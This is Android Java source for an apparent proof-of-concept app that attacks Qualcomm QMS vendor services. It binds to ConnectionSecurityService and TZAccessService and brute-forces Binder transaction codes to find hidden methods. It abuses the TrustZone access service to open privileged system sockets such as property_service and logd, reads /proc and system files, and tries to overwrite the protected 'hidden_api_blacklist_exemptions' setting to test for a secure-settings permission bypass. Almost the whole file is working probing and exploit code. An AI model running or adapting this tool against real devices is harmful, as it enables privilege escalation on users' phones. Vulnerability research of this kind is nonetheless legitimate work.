package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.connectionsecuritysdk.IRticService;
import com.qualcomm.qti.qms.connectionsecuritysdk.IServiceManager;
import com.qualcomm.qti.qms.connectionsecuritysdk.ITlocService;
import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG_CS = "com.qualcomm.qti.qms.service.connectionsecurity";
    private static final String TARGET_CLS_CS = "com.qualcomm.qti.qms.service.connectionsecurity.core.ConnectionSecurityService";
    private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IServiceManager mServiceManager;
    private IMinkSocketFd mTZService;
    private boolean isBoundCS = false;
    private boolean isBoundTZ = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    private ServiceConnection csConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mServiceManager = IServiceManager.Stub.asInterface(service);
            appendLog("CS Service bound");
            if (mTZService != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mServiceManager = null;
            isBoundCS = false;
            enableButtons(true, false);
            updateStatus("CS disconnected");
        }
    };

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTZService = IMinkSocketFd.Stub.asInterface(service);
            appendLog("TZ Service bound");
            if (mServiceManager != null) startTests();
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {
            mTZService = null;
            isBoundTZ = false;
            enableButtons(true, false);
            updateStatus("TZ disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindServices();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindServices() {
        try {
            Intent intentCS = new Intent();
            intentCS.setClassName(TARGET_PKG_CS, TARGET_CLS_CS);
            isBoundCS = bindService(intentCS, csConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundCS) appendLog("CS bind failed");

            Intent intentTZ = new Intent();
            intentTZ.setClassName(TARGET_PKG_TZ, TARGET_CLS_TZ);
            isBoundTZ = bindService(intentTZ, tzConnection, Context.BIND_AUTO_CREATE);
            if (!isBoundTZ) appendLog("TZ bind failed");

            if (!isBoundCS && !isBoundTZ) {
                appendLog("Failed to bind any service");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void startTests() {
        if (testThread != null && testThread.isAlive()) return;
        testThread = new Thread(() -> executeFullTest());
        testThread.start();
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeFullTest() {
        appendLog("========== PHASE 1: CS Service Enumeration ==========");
        if (mServiceManager != null) {
            IBinder rticBinder = getService("rtic");
            if (rticBinder != null) {
                IRticService rtic = IRticService.Stub.asInterface(rticBinder);
                testRticFlags(rtic);
                discoverMethods(rticBinder, "IRticService");
            }
            IBinder tlocBinder = getService("tloc");
            if (tlocBinder != null) {
                ITlocService tloc = ITlocService.Stub.asInterface(tlocBinder);
                testTloc(tloc);
                discoverMethods(tlocBinder, "ITlocService");
                testTlocHiddenMethod(tlocBinder);
            }
        }

        appendLog("========== PHASE 2: TZAccess Socket Connect ==========");
        if (mTZService != null) {
            tryConnectViaTZ("/dev/socket/minksocket");
            tryConnectViaTZ("/dev/socket/ssgqmig");
            tryConnectViaTZ("/dev/socket/mdnsd");
            tryConnectViaTZ("/dev/socket/tcm");
            tryConnectViaTZ("/dev/socket/fwmarkd");
            tryConnectViaTZ("/dev/socket/dnsproxyd");
            tryConnectViaTZ("/dev/socket/logd");
            tryConnectViaTZ("/dev/socket/property_service");
        }

        appendLog("========== PHASE 3: Deep File System Exploration ==========");
        exploreDeepFiles();

        appendLog("========== PHASE 4: Settings Manipulation ==========");
        testSettingsWrite();

        appendLog("========== ALL TESTS COMPLETED ==========");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private IBinder getService(String serviceName) {
        if (mServiceManager == null) return null;
        try {
            int[] status = new int[1];
            IBinder binder = mServiceManager.getService(serviceName, new byte[0], status);
            if (binder != null) {
                appendLog("Got " + serviceName + " binder, status=" + status[0]);
                return binder;
            } else {
                appendLog("Failed to get " + serviceName + ", status=" + status[0]);
                return null;
            }
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testRticFlags(IRticService rtic) {
        appendLog("--- Testing RTIC with flags ---");
        long[] flags = {0, 8, 32, 64, 2147483648L, 8|32, 8|64, 32|64, 8|32|64};
        for (long flag : flags) {
            try {
                int[] status = new int[1];
                int[] ret = new int[1];
                byte[] data = rtic.getRticData(flag, status, ret, false);
                appendLog("Flag " + flag + " -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            } catch (RemoteException e) {
                appendLog("RemoteException for flag " + flag + ": " + e.getMessage());
            }
        }
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = rtic.getRticData(0, status, ret, true);
            appendLog("z=true -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTloc(ITlocService tloc) {
        appendLog("--- Testing ITlocService ---");
        try {
            int[] status = new int[1];
            int[] ret = new int[1];
            byte[] data = tloc.getTrustedLocation(status, ret);
            appendLog("getTrustedLocation -> status=" + status[0] + ", ret=" + ret[0] + ", len=" + (data != null ? data.length : 0));
            int warmup = tloc.tlocWarmUp();
            appendLog("tlocWarmUp returned: " + warmup);
        } catch (RemoteException e) {
            appendLog("RemoteException: " + e.getMessage());
        }
    }

    private void testTlocHiddenMethod(IBinder binder) {
        appendLog("--- Testing hidden method (code 2) of ITlocService ---");
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(binder.getInterfaceDescriptor());
            data.writeInt(123);
            data.writeString("test");
            boolean success = binder.transact(2, data, reply, 0);
            if (success) {
                appendLog("Hidden method call succeeded, reply size=" + reply.dataSize());
                reply.setDataPosition(0);
                try {
                    int result = reply.readInt();
                    appendLog("  readInt: " + result);
                } catch (Exception e) {}
                try {
                    String s = reply.readString();
                    appendLog("  readString: " + s);
                } catch (Exception e) {}
            } else {
                appendLog("Hidden method call failed");
            }
        } catch (Exception e) {
            appendLog("Hidden method error: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
    }

    private void discoverMethods(IBinder binder, String name) {
        appendLog("--- Discovering hidden methods for " + name + " ---");
        for (int code = 1; code <= 30; code++) {
            if (stopRequested.get()) break;
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(binder.getInterfaceDescriptor());
                boolean success = binder.transact(code, data, reply, 0);
                if (success) {
                    appendLog("Method " + code + " succeeded, reply size=" + reply.dataSize());
                    reply.setDataPosition(0);
                    try {
                        int result = reply.readInt();
                        appendLog("  readInt: " + result);
                    } catch (Exception e) {}
                } else {
                    appendLog("Method " + code + " failed");
                }
            } catch (Exception e) {
                appendLog("Method " + code + " threw: " + e.getClass().getSimpleName());
            } finally {
                data.recycle();
                reply.recycle();
            }
        }
    }

    private void tryConnectViaTZ(String path) {
        appendLog("Trying TZAccess connect to " + path);
        if (mTZService == null) {
            appendLog("  TZ service not available");
            return;
        }
        try {
            int[] iArr = new int[1];
            ParcelFileDescriptor pfd = mTZService.a(path, iArr);
            if (pfd != null) {
                appendLog("  Got FD: " + iArr[0] + " for " + path);
                try {
                    java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
                    if (fdesc != null && fdesc.valid()) {
                        java.io.OutputStream os = new java.io.FileOutputStream(fdesc);
                        java.io.InputStream is = new java.io.FileInputStream(fdesc);
                        os.write("help\n".getBytes(StandardCharsets.UTF_8));
                        os.flush();
                        byte[] buf = new byte[512];
                        int len = is.read(buf);
                        if (len > 0) {
                            appendLog("  Response: " + new String(buf, 0, len, StandardCharsets.UTF_8));
                        } else {
                            appendLog("  No response");
                        }
                        os.close();
                        is.close();
                    }
                } catch (Exception e) {
                    appendLog("  FD read/write error: " + e.getMessage());
                }
                pfd.close();
            } else {
                appendLog("  Failed to get FD for " + path);
            }
        } catch (RemoteException e) {
            appendLog("  RemoteException: " + e.getMessage());
        } catch (Exception e) {
            appendLog("  Error: " + e.getMessage());
        }
    }

    private void exploreDeepFiles() {
        appendLog("--- Deep File System Exploration ---");
        String[] additionalProc = {
            "/proc/self/fd",
            "/proc/self/cwd",
            "/proc/self/root",
            "/proc/self/maps",
            "/proc/self/smaps",
            "/proc/self/oom_adj",
            "/proc/self/oom_score",
            "/proc/self/comm",
            "/proc/self/auxv",
            "/proc/self/limits",
            "/proc/self/sched",
            "/proc/self/stack",
            "/proc/self/statm",
            "/proc/self/wchan",
            "/proc/self/pagemap",
            "/proc/self/clear_refs",
            "/proc/self/timers",
            "/proc/self/attr/current",
            "/proc/self/loginuid",
            "/proc/self/sessionid",
            "/proc/self/cgroup"
        };
        for (String p : additionalProc) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        String[] sysFiles = {
            "/system/build.prop",
            "/system/etc/hosts",
            "/system/etc/security/cacerts/",
            "/vendor/build.prop",
            "/proc/version"
        };
        for (String p : sysFiles) {
            if (stopRequested.get()) break;
            readFileContent(p);
        }

        File tmpDir = new File("/data/local/tmp");
        if (tmpDir.exists() && tmpDir.canRead()) {
            appendLog("Reading /data/local/tmp contents:");
            File[] children = tmpDir.listFiles();
            if (children != null) {
                for (File f : children) {
                    appendLog("  " + f.getName());
                }
            }
        } else {
            appendLog("/data/local/tmp not readable");
        }

        File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        if (download.exists() || download.mkdirs()) {
            File testFile = new File(download, "poc_write_test.txt");
            try (FileOutputStream fos = new FileOutputStream(testFile)) {
                fos.write("Deep exploration test\n".getBytes(StandardCharsets.UTF_8));
                appendLog("Write to " + testFile.getAbsolutePath() + " succeeded");
            } catch (Exception e) {
                appendLog("Write failed: " + e.getMessage());
            }
        }
    }

    private void readFileContent(String path) {
        File f = new File(path);
        if (!f.exists()) {
            appendLog(path + " does not exist");
            return;
        }
        if (!f.canRead()) {
            appendLog(path + " not readable");
            return;
        }
        if (f.isDirectory()) {
            appendLog(path + " is a directory, listing contents:");
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) {
                    appendLog("  " + child.getName());
                }
            }
            return;
        }
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] data = new byte[4096];
            int len = fis.read(data);
            if (len > 0) {
                String content = new String(data, 0, len, StandardCharsets.UTF_8);
                appendLog("Content of " + path + ": " + content);
            } else {
                appendLog("Empty file: " + path);
            }
        } catch (Exception e) {
            appendLog("Error reading " + path + ": " + e.getMessage());
        }
    }

    private void testSettingsWrite() {
        appendLog("--- Settings Write ---");
        try {
            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
            appendLog("Current hidden_api_blacklist_exemptions: " + current);
            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test");
            if (success) {
                appendLog("WRITE_SECURE_SETTINGS succeeded!");
                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
            } else {
                appendLog("WRITE_SECURE_SETTINGS failed");
            }
        } catch (Exception e) {
            appendLog("Settings error: " + e.getMessage());
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) {
                ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
            }
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) {
                appendLog("Cannot create Download dir");
                return;
            }
            File file = new File(dir, "final_evolved_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Final Evolved PoC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(this, "検査が終了したから終了しま~す", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 2000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBoundCS) unbindService(csConnection);
        if (isBoundTZ) unbindService(tzConnection);
        saveLog();
    }
}
